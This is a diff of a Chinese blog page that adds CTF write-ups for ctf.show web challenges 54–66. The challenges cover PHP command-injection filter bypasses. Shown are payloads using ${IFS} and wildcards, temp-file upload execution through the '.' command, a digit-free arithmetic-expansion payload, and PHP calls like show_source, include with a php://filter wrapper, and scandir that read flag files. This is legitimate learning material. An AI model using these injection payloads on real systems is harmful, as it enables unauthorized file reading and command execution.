@@ -470,7 +470,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    930
+                    1.4k
                 </div>
                 
 
@@ -667,6 +667,139 @@
 <h2 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h2><h3 id="1-利用cp命令"><a href="#1-利用cp命令" class="headerlink" title="1. 利用cp命令"></a>1. 利用cp命令</h3><pre class="line-numbers language-none"><code class="language-none">?c&#x3D;cp$&#123;IFS&#125;fla?.???$&#123;IFS&#125;b.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <h3 id="2-查看b-txt"><a href="#2-查看b-txt" class="headerlink" title="2. 查看b.txt"></a>2. 查看b.txt</h3><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1grdlmjd91bj30m90a7jsy.jpg" alt="image-20210610234208248"></p>
+<h2 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h2><h3 id="1-利用cp命令-1"><a href="#1-利用cp命令-1" class="headerlink" title="1. 利用cp命令"></a>1. 利用cp命令</h3><pre class="line-numbers language-none"><code class="language-none">cp$&#123;IFS&#125;fl?g.php$&#123;IFS&#125;b.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ul>
+<li>注意：不能按顺序出现正则表达式的字母</li>
+</ul>
+<h3 id="2-查看b-txt-1"><a href="#2-查看b-txt-1" class="headerlink" title="2. 查看b.txt"></a>2. 查看b.txt</h3><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1grfmy3w2egj30sr0giwh2.jpg" alt="image-20210612175902664"></p>
+<h2 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h2><h3 id="无符号数字的命令执行"><a href="#无符号数字的命令执行" class="headerlink" title="* 无符号数字的命令执行 *"></a>* 无符号数字的命令执行 *</h3><h3 id="1-解题思路"><a href="#1-解题思路" class="headerlink" title="1. 解题思路:"></a>1. 解题思路:</h3><ul>
+<li>构造<code>post</code>数据包上传文件，<code>linux</code>系统下会保存在/tmp/php??????</li>
+<li>抓包，使文件中包含sh‘命令</li>
+<li>利用<code>.</code>执行</li>
+</ul>
+<h3 id="2-解题方式"><a href="#2-解题方式" class="headerlink" title="2. 解题方式"></a>2. 解题方式</h3><h4 id="2-1-POST提交数据包"><a href="#2-1-POST提交数据包" class="headerlink" title="2. 1 POST提交数据包"></a>2. 1 POST提交数据包</h4><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>POST数据包POC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show/<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token comment">&lt;!--链接是当前打开的题目链接--></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>文件名：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>提交<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="2-2-抓包，输入命令"><a href="#2-2-抓包，输入命令" class="headerlink" title="2.2 抓包，输入命令"></a>2.2 抓包，输入命令</h4><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1grim5g3movj30ss0d6wha.jpg" alt="image-20210615074808348"></p>
+<ul>
+<li>注意</li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">tmp目录下文件比较多，我们所上传的文件最后一个字母是大写，因此利用ascii字母的大写匹配，过滤掉其他文件[@-[]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1grimd9nj1mj30ce0jrab9.jpg" alt="image-20210615075542249"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1grimdzr5n7j30br07adg7.jpg" alt="image-20210615075624657"></p>
+<h2 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h2><ul>
+<li>与上一题类似</li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1grj27q2uwvj30zk0lzn0o.jpg" alt="image-20210615170354875"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1grj29uydbaj30zk0lz42i.jpg" alt="image-20210615170600718"></p>
+<h2 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h2><ul>
+<li>题目要求<code>flag</code>的文件名是36</li>
+<li>利用没有过滤的字符构造36</li>
+</ul>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token punctuation">&#123;</span>_<span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token string">""</span>
+<span class="token variable"><span class="token variable">$((</span>$&#123;_&#125;<span class="token variable">))</span></span><span class="token operator">=</span><span class="token number">0</span>
+<span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span>$&#123;_&#125;<span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token operator">=</span>-1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gs741n5mspj308m055jrt.jpg" alt="image-20210706122043754"></p>
+<p>payload：</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span>$<span class="token punctuation">((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token punctuation">))</span><span class="token punctuation">))</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gs742mpg47j30fl03bgls.jpg" alt="image-20210706122148253"></p>
+<p>这里:</p>
+<ul>
+<li>37个<code>$((~$(())))</code></li>
+</ul>
+<p>然后:</p>
+<ul>
+<li>取反<code>～</code>37个<code>$((~$(())))</code></li>
+</ul>
+<p>最后:</p>
+<ul>
+<li>得出结果<code>$((~37个$((~$(())))))</code></li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gs74mp3k2dj30g507vt9j.jpg" alt="image-20210706124103838"></p>
+<p>绝了。。。</p>
+<h2 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h2><ul>
+<li>基本思想是查看phpinfo看看什么函数被过滤，但是<code>phpinfo</code>也被过滤</li>
+</ul>
+<h3 id="盲猜"><a href="#盲猜" class="headerlink" title="盲猜"></a>盲猜</h3><ul>
+<li>利用函数<code>show_source(&#39;flag.php&#39;);</code></li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gs74ssaecij30pa0fh0u1.jpg" alt="image-20210706124657681"></p>
+<pre class="line-numbers language-none"><code class="language-none">echo file_get_contents(&#39;flag.php&#39;); &#x2F;&#x2F;也可以<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<h2 id="web59"><a href="#web59" class="headerlink" title="web59"></a>web59</h2><ul>
+<li>同上</li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gs74uway20j30ie0gfab5.jpg" alt="image-20210706124859461"></p>
+<p>新姿势:</p>
+<ul>
+<li>include没有禁用</li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">post传参数：
+				include($_GET[1])
+GET传参数：
+				?1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64.encode&#x2F;resource&#x3D;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h2 id="web60-65"><a href="#web60-65" class="headerlink" title="web60-65"></a>web60-65</h2><ul>
+<li><p>同上</p>
+</li>
+<li><p><code>?c=highlight_file(&#39;flag.php&#39;);</code></p>
+</li>
+<li><p><code>include(flag.php);echo $flag;</code></p>
+</li>
+<li><p><code>include(&#39;flag.php&#39;);var_dump(get_defined_vars());</code></p>
+</li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gs79gohuhwj30k00bnwig.jpg" alt="image-20210706152816900"></p>
+<ul>
+<li><p><code>print_r(standir(&#39;.&#39;));</code></p>
+</li>
+<li><p><code>curl</code></p>
+</li>
+</ul>
+<h2 id="web66"><a href="#web66" class="headerlink" title="web66"></a>web66</h2><ul>
+<li>不在之前的<code>flag.php</code>中</li>
+<li>查询目录找一找有没有其他文件</li>
+</ul>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//查询当前目录</span>
+
+<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//查询根目录</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li>查看源代码</li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gs7boakimdj308d0bewf2.jpg" alt="image-20210706164450321"></p>
+<ul>
+<li>查看<code>flag.txt</code></li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">c&#x3D;highlight_file(&#39;&#x2F;flag.txt&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gs7bpzupzqj30co0233z2.jpg" alt="image-20210706164628978"></p>
 
                 
             </div>
